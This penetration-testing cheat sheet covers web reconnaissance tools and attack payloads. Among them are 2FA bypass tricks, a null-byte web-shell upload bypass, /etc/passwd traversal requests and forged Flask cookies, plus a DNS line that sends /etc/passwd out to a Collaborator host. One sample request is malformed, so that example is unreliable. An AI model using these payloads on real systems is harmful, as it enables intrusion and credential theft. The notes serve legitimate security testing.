# Web Application Analysis

- [Resources](#resources)

## Table of Contents

- [2FA Bypass Techniques](#2fa-bypass-techniques)
- [403 Bypass](#403-bypass)
- [Asset Discovery](#asset-discovery)
- [Burp Suite](#burp-suite)
- [Bypassing File Upload Restrictions](#bypassing-file-upload-restrictions)
- [cadaver](#cadaver)
- [Command Injection](#command-injection)
- [commix](#commix)
- [Common File Extensions](#common-file-extensions)
- [curl](#curl)
- [davtest](#davtest)
- [DirBuster](#dirbuster)
- [Directory Traversal Attack](#directory-traversal-attack)
- [dirsearch](#dirsearch)
- [DNS Smuggling](#dns-smuggling)
- [DS_Walk](#ds_walk)
- [Favicon](#favicon)
- [feroxbuster](#feroxbuster)
- [ffuf](#ffuf)
- [Flask-Unsign](#flask-unsign)
- [gf](#gf)
- [GitHub](#github)
- [GitTools](#gittools)
- [GIXY](#gixy)
- [Gobuster](#gobuster)
- [gron](#gron)
- [hakcheckurl](#hakcheckurl)
- [Hakrawler](#hakrawler)
- [Host Header Regex Bypass](#host-header-regex-bypass)
- [HTML Injection](#html-injection)
- [HTTP Request Methods](#http-request-methods)
- [HTTP Request Smuggling / HTTP Desync Attack](#http-request-smuggling--http-desync-attack)
- [httprobe](#httprobe)
- [httpx](#httpx)
- [Interactsh](#interactsh)
- [JavaScript](#javascript)
- [Jenkins](#jenkins)
- [jsleak](#jsleak)
- [JWT_Tool](#jwt_tool)
- [Kyubi](#kyubi)
- [Leaky Paths](#leaky-paths)
- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
- [Lodash](#lodash)
- [Log Poisoning](#log-poisoning)
- [Magic Bytes](#magic-bytes)
- [mitmproxy](#mitmproxy)
- [ngrok](#ngrok)
- [OpenSSL](#openssl)
- [PadBuster](#padbuster)
- [PDF PHP Inclusion](#pdf-php-inclusion)
- [PHP](#php)
- [Poison Null Byte](#poison-null-byte)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
- [Subdomain Takeover](#subdomain-takeover)
- [Symfony](#symfony)
- [unfurl](#unfurl)
- [Upload Filter Bypass](#upload-filter-bypass)
- [Upload Vulnerabilities](#upload-vulnerabilities)
- [waybackurls](#waybackurls)
- [Web Log Poisoning](#web-log-poisoning)
- [Websocket Request Smuggling](#websocket-request-smuggling)
- [Wfuzz](#wfuzz)
- [WhatWeb](#whatweb)
- [Wordpress](#wordpress)
- [WPScan](#wpscan)
- [XML External Entity (XXE)](#xml-external-entity-xxe)
- [XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)](#xsrfprobe-cross-site-request-forgery--csrf--xsrf)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AllThingsSSRF | This is a collection of writeups, cheatsheets, videos, related to SSRF in one single location. | https://github.com/jdonsec/AllThingsSSRF |
| anew | A tool for adding new lines to files, skipping duplicates. | https://github.com/tomnomnom/anew |
| Arjun | HTTP Parameter Discovery Suite | https://github.com/s0md3v/Arjun |
| Awesome API Security | A collection of awesome API Security tools and resources. | https://github.com/arainho/awesome-api-security |
| cariddi | Take a list of domains, crawl urls and scan for endpoints, secrets, api keys, file extensions, tokens and more. | https://github.com/edoardottt/cariddi |
| CipherScan | Cipherscan tests the ordering of the SSL/TLS ciphers on a given target, for all major versions of SSL and TLS. | https://github.com/mozilla/cipherscan |
| Client-Side Prototype Pollution | In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to document.location parsing and useful script gadgets that can be used to demonstrate the impact. | https://github.com/BlackFan/client-side-prototype-pollution |
| Commix | Commix (short for [comm]and [i]njection e[x]ploiter) is an open source penetration testing tool. | https://github.com/commixproject/commix |
| cookie-monster | A utility for automating the testing and re-signing of Express.js cookie secrets. | https://github.com/DigitalInterruption/cookie-monster |
| DalFox | DalFox is an powerful open source XSS scanning tool and parameter analyzer and utility that fast the process of detecting and verify XSS flaws. | https://github.com/hahwul/dalfox |
| DOMXSS Wiki | The DOMXSS Wiki is a Knowledge Base for defining sources of attacker controlled inputs and sinks which potentially could introduce DOM Based XSS issues. | https://github.com/wisec/domxsswiki/wiki |
| DS_Walk | Python tool for enumerating directories and files on web servers that contain a publicly readable .ds_store file. | https://github.com/Keramas/DS_Walk |
| DumpsterDiver | DumpsterDiver is a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords. | https://github.com/securing/DumpsterDiver |
| EarlyBird | EarlyBird is a sensitive data detection tool capable of scanning source code repositories for clear text password violations, PII, outdated cryptography methods, key files and more. | https://github.com/americanexpress/earlybird |
| ezXSS | ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting. | https://github.com/ssl/ezXSS |
| feroxbuster | A simple, fast, recursive content discovery tool written in Rust. | https://github.com/epi052/feroxbuster |
| ffuf | A fast web fuzzer written in Go. | https://github.com/ffuf/ffuf |
| gf | A wrapper around grep, to help you grep for things | https://github.com/tomnomnom/gf |
| GitDorker | GitDorker is a tool that utilizes the GitHub Search API and an extensive list of GitHub dorks that I've compiled from various sources to provide an overview of sensitive information stored on github given a search query. | https://github.com/obheda12/GitDorker |
| GitTools | This repository contains three small python/bash scripts used for the Git research. | https://github.com/internetwache/GitTools |
| Gobuster | Gobuster is a tool used to brute-force URIs, DNS subdomains, Virtual Host names and open Amazon S3 buckets | https://github.com/OJ/gobuster |
| grayhatwarfare shorteners | Search Shortener Urls | https://shorteners.grayhatwarfare.com |
| gron | Make JSON greppable! | https://github.com/tomnomnom/gron |
| Hakrawler | Fast golang web crawler for gathering URLs and JavaScript file locations. | https://github.com/hakluke/hakrawler |
| haktrails | Golang client for querying SecurityTrails API data. | https://github.com/hakluke/haktrails |
| httpbin | A simple HTTP Request & Response Service. | https://httpbin.org/#/ |
| httprobe | Take a list of domains and probe for working HTTP and HTTPS servers | https://github.com/tomnomnom/httprobe |
| httpx | httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads. | https://github.com/projectdiscovery/httpx |
| interact.sh | HTTP Request & Response Service | https://app.interactsh.com/#/ |
| ipsourcebypass | This Python script can be used to bypass IP source restrictions using HTTP headers. | https://github.com/p0dalirius/ipsourcebypass |
| Java-Deserialization-Cheat-Sheet | The cheat sheet about Java Deserialization vulnerabilities | https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet |
| JSFuck | JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code. | http://www.jsfuck.com |
| JSFuck []()!+ | Write any JavaScript with 6 Characters: []()!+ | https://github.com/aemkei/jsfuck |
| jsleak | jsleak is a tool to find secret , paths or links in the source code during the recon. | https://github.com/channyein1337/jsleak |
| JSON Web Tokens | JSON Web Token Debugger | https://jwt.io |
| JWT_Tool | The JSON Web Token Toolkit v2 | https://github.com/ticarpi/jwt_tool |
| KeyHacks | KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid. | https://github.com/streaak/keyhacks |
| Leaky Paths | A collection of special paths linked to major web CVEs, known misconfigurations, juicy APIs ..etc. It could be used as a part of web content discovery, to scan passively for high-quality endpoints and quick-wins. | https://github.com/ayoubfathi/leaky-paths |
| Lodash | The Lodash library exported as a UMD module. | https://github.com/lodash/lodash |
| ngrok | ngrok is the programmable network edge that adds connectivity, security, and observability to your apps with no code changes. | https://ngrok.com |
| Notify | Notify is a Go-based assistance package that enables you to stream the output of several tools (or read from a file) and publish it to a variety of supported platforms. | https://github.com/projectdiscovery/notify |
| NtHiM | Super Fast Sub-domain Takeover Detection | https://github.com/TheBinitGhimire/NtHiM |
| Oralyzer | Oralyzer, a simple python script that probes for Open Redirection vulnerability in a website. | https://github.com/r0075h3ll/Oralyzer |
| PayloadsAllTheThings | A list of useful payloads and bypasses for Web Application Security. | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHPGGC | PHPGGC: PHP Generic Gadget Chains | https://github.com/ambionics/phpggc |
| pingb | HTTP Request & Response Service | http://pingb.in |
| Recox | The script aims to help in classifying vulnerabilities in web applications. | https://github.com/samhaxr/recox |
| reNgine | The only web application recon tool you will ever need! | https://github.com/yogeshojha/rengine |
| Request Catcher | Request Catcher will create a subdomain on which you can test an application. | https://requestcatcher.com |
| SSRFIRE | An automated SSRF finder. Just give the domain name and your server and chill! ;) Also has options to find XSS and open redirects | https://github.com/ksharinarayanan/SSRFire |
| SSRFmap | SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. | https://github.com/swisskyrepo/SSRFmap |
| SSRF testing resources | SSRF (Server Side Request Forgery) testing resources | https://github.com/cujanovic/SSRF-Testing |
| SSTImap | Automatic SSTI detection tool with interactive interface | https://github.com/vladko312/SSTImap |
| toxssin | An XSS exploitation command-line interface and payload generator. | https://github.com/t3l3machus/toxssin |
| Tplmap | Server-Side Template Injection and Code Injection Detection and Exploitation Tool | https://github.com/epinna/tplmap |
| truffleHog | Find leaked credentials. | https://github.com/trufflesecurity/truffleHog |
| unfurl | Pull out bits of URLs provided on stdin | https://github.com/tomnomnom/unfurl |
| waybackurls | Fetch all the URLs that the Wayback Machine knows about for a domain | https://github.com/tomnomnom/waybackurls |
| Webhook.site | Webhook.site lets you easily inspect, test and automate (with the visual Custom Actions builder, or WebhookScript) any incoming HTTP request or e-mail. | https://webhook.site |
| Weird Proxies | It's a cheat sheet about behaviour of various reverse proxies and related attacks. | https://github.com/GrrrDog/weird_proxies |
| Wfuzz | Wfuzz - The Web Fuzzer | https://github.com/xmendez/wfuzz |
| WhatWeb | Next generation web scanner | https://github.com/urbanadventurer/WhatWeb |
| WPScan | WordPress Security Scanner | https://github.com/wpscanteam/wpscan |
| x8 | Hidden parameters discovery suite written in Rust. | https://github.com/Sh1Yo/x8 |
| XSRFProbe | The Prime Cross Site Request Forgery Audit & Exploitation Toolkit. | https://github.com/0xInfection/XSRFProbe |
| XSStrike | Most advanced XSS scanner. | https://github.com/s0md3v/XSStrike |
| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |

## 2FA Bypass Techniques

### 1. Response Manipulation

If the value `"success":false` can be found in the response, change it to `"success":true`.

### 2. Status Code Manipulation

If theStatus Code is `4xx` try to change it to `200 OK` and see if it bypasses restrictions.

### 3. 2FA Code Leakage in Response

Check the response of the `2FA Code Triggering Request` to see if the code is leaked.

### 4. JS File Analysis

Rare but some `JS Files` may contain info about the `2FA Code`, worth giving a shot.

### 5. 2FA Code Reusability

Same code can be reused.

### 6. Lack of Brute-Force Protection

Possible to `Brute-Force` any length 2FA Code.

### 7. Missing 2FA Code Integrity Validation

Code for `any` user account can be used to bypass the 2FA.

### 8. CSRF on 2FA Disabling

No `CSRF Protection` on `Disable 2FA`, also there is no `Authentication Confirmation`.

### 9. Password Reset Disable 2FA

2FA gets disabled on `Password Change or Email Change`.

### 10. Clickjacking on 2FA Disabling Page

Put an `Iframe` on the `2FA Disabling Page` and use `Social Engineering` to trick the victim to disable 2FA.

### 11. Bypass 2FA with null or 000000

Enter the code `000000` or `null` to bypass 2FA protection.

#### Steps:

1. Enter `null` in 2FA code.
2. Enter `000000` in 2FA code.
3. Send empty code - Someone found this in Grammarly.
4. Open a new tab in the same browser and check if other `API Endpoints` are accessible without entering 2FA.

### 12. Google Authenticator Bypass

#### Steps:

1. Set-up Google Authenticator for 2FA.
2. Now, 2FA is enabled.
3. Go on the `Password Reset Page` and `change` your `password`.
4. If your website redirects you to your dashboard then `2FA (Google Authenticator)` is bypassed.

### 13. Bypassing OTP in Registration Forms by repeating the Form Eubmission multiple Times using Repeater

#### Steps:

1. Create an account with a `non-existing` phone number.
2. Intercept the request in `Burp Suite`.
3. Send the request to the repeater and forward.
4. Go to the Repeater tab and `change` the `non-existent` phone number to your phone number.
5. If you got an OTP to your phone, try using that OTP to register that non-existent number.

## 403 Bypass

### HTTP Header Payload

```c
$ curl -I http://<RHOST> -H "X-Client-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-CLIENT-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
```

## Asset Discovery

```c
$ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
```

## Burp Suite

> https://portswigger.net/burp

### Filter Options

- Proxy > Options > Intercept Client Requets > Is in target scope
- Proxy > Options > Intercept Server Responses > Is in target scope

### Shortcuts

```c
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

### Tweaks

Burp Suite > Proxy > Proxy settings > TLS pass through

```c
.*\.google\.com 
.*\.gstatic\.com
.*\.mozilla\.com
.*\.googleapis\.com
.*\.pki\.google\.com
```

### Set Proxy Environment Variables

```c
$ export http_proxy=http://localhost:8080
$ export https_proxy=https://localhost:8080
$ http_proxy=localhost:8080 https_proxy=localhost:8080 <COMMAND> <RHOST>
```

### Extensions

- 5GC API Parser
- 403 Bypasser
- Active Scan++
- Asset Discovery
- Autorize
- Backslash Powered Scanner
- CO2
- Collaborator Everywhere
- Distribute Damage
- Encode IP
- GAP
- IIS Tilde
- IP Rotate
- J2EEScan
- JS Link Finder
- JS Miner
- JSON Web Tokens
- Logger++
- Log Viewer
- Look Over There
- Param Miner
- SAML Raider
- Software Vulnerability Scanner
- SQLiPy Sqlmap Integration
- Upload Scanner
- ViewState Editor

### Filter for SSRF (AutoRepeater)

```c
((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})
```

## Bypassing File Upload Restrictions

* file.php -> file.jpg
* file.php -> file.php.jpg
* file.asp -> file.asp;.jpg
* file.gif (contains php code, but starts with string GIF/GIF98)
* 00%
* file.jpg with php backdoor in exif (see below)
* .jpg -> proxy intercept -> rename to .php

### PDF Upload Filter Bypass

Create a `PHP Reverse / Web Shell`, name it `shell.phpX.pdf` and `zip` it.

```c
$ touch shell.phpX.pdf
$ zip shell.zip shell.phpX.pdf
```

Open the `Zip Archive` in your favourite `Hex Editor`.

```c
00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
00000A90  2E 70 68 70 58 2E 70 64  66 55 54 05 00 03 A3 6F  .phpX.pdfUT....o
```

Replace the `X` with `Null Bytes (00)` and save it.

```c
00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
00000A90  2E 70 68 70 00 2E 70 64  66 55 54 05 00 03 A3 6F  .php..pdfUT....o
```

After uploading you can remove the `space` and access the file.

## cadaver

### General Usage

```c
$ cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```

### Common Commands

```c
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

## Command Injection

### Vulnerable Functions in PHP

* Exec
* Passthru
* System

### Input Sanitisation

* filter_input

### Filter Bypass

```c
$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```

## commix

```c
$ python3 commix.py --url="http://<RHOST>:5013/graphql" --data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg
```

## Common File Extensions

```c
7z,action,ashx,asp,aspx,backup,bak,bz,c,cgi,conf,config,dat,db,dhtml,do,doc,docm,docx,dot,dotm,go,htm,html,ini,jar,java,js,js.map,json,jsp,jsp.source,jspx,jsx,log,old,pdb,pdf,phtm,phtml,pl,py,pyc,pyz,rar,rhtml,shtm,shtml,sql,sqlite3,svc,tar,tar.bz2,tar.gz,tsx,txt,wsdl,xhtm,xhtml,xls,xlsm,xlst,xlsx,xltm,xml,zip
```

```c
.7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

## curl

### Common Commands

```c
$ curl --trace - http://<RHOST>
```

### Uploading Files through Upload Forms

#### POST File

```c
$ curl -X POST -F "file=@/PATH/TO/FILE/<FILE>.php" http://<RHOST>/<FILE>.php --cookie "cookie"
```

#### POST Binary Data to Web Form

```c
$ curl -F "field=<file.zip" http://<RHOST>/<FILE>.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

## davtest

```c
$ davtest -auth <USERNAME>:<FOOBAR> -sendbd auto -url http://<RHOST>/<WEBDAV_DIRECTORY>/
```

## DirBuster

> https://github.com/KajanM/DirBuster

```c
-r    // don't search recursively
-w    // scan with big wordlists

$ dirb http://<RHOST>
```

## Directory Traversal Attack

### Skeleton Payload Request

```c
GET /../../../../../../../../etc/passwd HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1
```

### Read /etc/passwd

```c
GET // HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1GET /../../../../../../../../etc/passwd HTTP/1.1
```

## dirsearch

> https://github.com/maurosoria/dirsearch

### General Usage

```c
-i    // includes specific status codes
-e    // excludes specific status codes
-x    // excludes specific status codes
-m    // specifies HTTP method
```

### Common Commands

```c
$ dirsearch -u http://<RHOST>:<RPORT>
$ dirsearch -u http://<RHOST>:<RPORT> -m POST
$ dirsearch -u http://<RHOST>:<RPORT> -e *
$ dirsearch -u http://<RHOST>:<RPORT>/ -R 5 -e http,php,html,css /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt
```

## DNS Smuggling

```c
GETID=$(cat /etc/passwd | head -n 1 | base64) && nslookup $GETID.0wdj2957gw6t7g5463t7063hy.burpcollborator.net
```

## DS_Walk

> https://github.com/Keramas/DS_Walk

```c
$ python ds_walk.py -u http://<RHOST>
```

## Favicon

> https://wiki.owasp.org/index.php/OWASP_favicon_database

```c
$ curl https://<RHOST>/sites/favicon/images/favicon.ico | md5sum
```

## feroxbuster

> https://github.com/epi052/feroxbuster

```c
$ feroxbuster -u http://<RHOST> -x js,bak,txt,png,jpg,jpeg,php,aspx,html --extract-links
```

## ffuf

> https://github.com/ffuf/ffuf

```c
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
$ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

### API Fuzzing

```c
$ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

### Searching for LFI

```c
$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

### Fuzzing with PHP Session ID

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

### Fuzzing with HTTP Request File

```c
$ ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -request <FILE> -request-proto "https" -mc 302 -t 150 | tee progress
```

### Testing

> http://fuff.me

#### Basic

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ
```

#### Recursion

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ -recursion
```

#### File Extensions

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/ext/logs/FUZZ -e .log
```

#### No 404 Header

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/no404/FUZZ -fs 669
```

#### Param Mining

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/param/data?FUZZ=1
```

#### Rate Limiting

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429
```

#### IDOR Testing

```c
$ seq 1 1000 | ffuf -w - -u http://ffuf.me/cd/pipes/user?id=FUZZ
```

#### Script for IDOR Testing

```c
#!/bin/bash

while read i
do
  if [ "$1" == "md5" ]; then
    echo -n $i | md5sum | awk '{ print $1 }'
  elif [ "$1" == "b64" ]; then
    echo -n $i | base64
  else
    echo $i
  fi
done
```

#### Use Script above for Base64 decoding

```c
$ seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://ffuf.me/cd/pipes/user2?id=FUZZ
```

#### MD5 Discovery using the Script

```c
$ seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://ffuf.me/cd/pipes/user3?id=FUZZ
```

#### Virtual Host Discovery

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs 1495
```

#### Massive File Extension Discovery

```c
$ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<TARGET>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

## Flask-Unsign

> https://github.com/Paradoxis/Flask-Unsign

```c
$ pip3 install flask-unsign
```

### Decode Cookie

```c
$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

### Brute Force

```c
$ flask-unsign --unsign --cookie < cookie.txt
```

### Unsigning a Cookie

```c
$ flask-unsign --unsign --no-literal-eval --wordlist /PATH/TO/WORDLIST/<FILE>.txt --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZm9vYmFyIn0.Yq4QPw.0Hj2xCfDMJi7ksNfR4Oe9yN7nYQ
```

### Signing a Cookie

```c
$ flask-unsign --sign --legacy --secret '<PASSWORD>' --cookie "{'logged_in': True, 'username': '<USER>'}"
```

### Signing a UUID Cookie

```c
$ flask-unsign --sign --cookie "{'logged_in': True}" --secret '<PASSWORD>'
$ flask-unsign --sign --cookie "{'cart_items': ["2" , "5" , "6"], 'uuid': 'e9e62997-0291-4f63-8dbe-10d035326c75' }" --secret '<SECRET_KEY>'
```

## gf

> https://github.com/tomnomnom/gf

```c
$ go install github.com/tomnomnom/gf@latest
```

## GitHub

### OpenAI API Key Code Search

```c
https://github.com/search?q=%2F%22sk-%5Ba-zA-Z0-9%5D%7B20%2C50%7D%22%2F&ref=simplesearch&type=code
```

### GitHub Dorks

> https://github.com/search?type=code

```c
/ftp:\/\/.*:.*@.*target\.com/
/ftp:\/\/.*:.*@.*\.*\.br/
/ftp:\/\/.*?@.*?\.com\.br/
/ssh:\/\/.*:.*@.*target\.com/
/ssh:\/\/.*:.*@.*\.*\.*\.br/
/ldap:\/\/.*:.*@.*\.*\.*\.com/
/mysql:\/\/.*:.*@.*\.*\.*\.com/
/mongodb:\/\/.*:.*@.*\.*\.*\.com/
/ldaps:\/\/.*:.*@.*\.*\.*\.com/
```

## GitTools

> https://github.com/internetwache/GitTools

### gitdumper

```c
$ ./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
```

### extractor

```c
$ ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

## GIXY

> https://github.com/yandex/gixy

```c
$ pip install gixy
$ gixy /etc/nginx/nginx.conf
```

## Gobuster

> https://github.com/OJ/gobuster

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -k --exclude-length <NUMBER>
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

### POST Requests

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

### DNS Recon

```c
$ gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
$ gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### VHost Discovery

```c
$ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
$ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Specifiy User Agent

```c
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

## gron

> https://github.com/tomnomnom/gron

```c
$ go install github.com/tomnomnom/gron@latest
```

## hakcheckurl

> https://github.com/hakluke/hakcheckurl

```c
$ go install github.com/hakluke/hakcheckurl@latest
```

## Hakrawler

> https://github.com/hakluke/hakrawler

```c
$ hakrawler -url <RHOST> -depth 3
$ hakrawler -url <RHOST> -depth 3 -plain
$ hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
```

## Host Header Regex Bypass

### Skeleton Payload Request

```c
POST /password-reset.php HTTP/1.1
Host: gymxcrossfit.htb/employees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://employees.crossfit.htb
DNT: 1
Connection: close
Referer: http://employees.crossfit.htb/password-reset.php
Upgrade-Insecure-Requests: 1

email=david.palmer%40crossfit.htb

...
Host: gymxcrossfit.htb/employees.crossfit.htb    # <--- Host Header getting set after the "/" so we can bypass the regex by adding this line
...
```

## HTML Injection

> https://hackerone.com/reports/724153

```c
Filename<b>testBOLD</b>
```

### Skeleton Payload

```c
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

## HTTP Request Methods

### HTTP GET

- Retrieve a single item or a list of items

```c
GET /v1/products/foobar
```

```c
$ curl -v -X GET -k https://example.com 80
```

#### Response

```c
<HTML>
  <HEAD>foobar</HEAD>
  <BODY>
    <H1>foobar</H1>
    <P>This is foobar</P>
  </BODY>
</HTML>
```
 
### HTTP PUT

- Update an item

```c
PUT /v1/users/123
```

#### Request Body

```c
{"name": "bob", "email": "bob@bob.com"}
```

#### Response

```c
HTTP/1.1 200 OK
```
 
### HTTP POST

- Create an item

```c
POST /v1/users
```

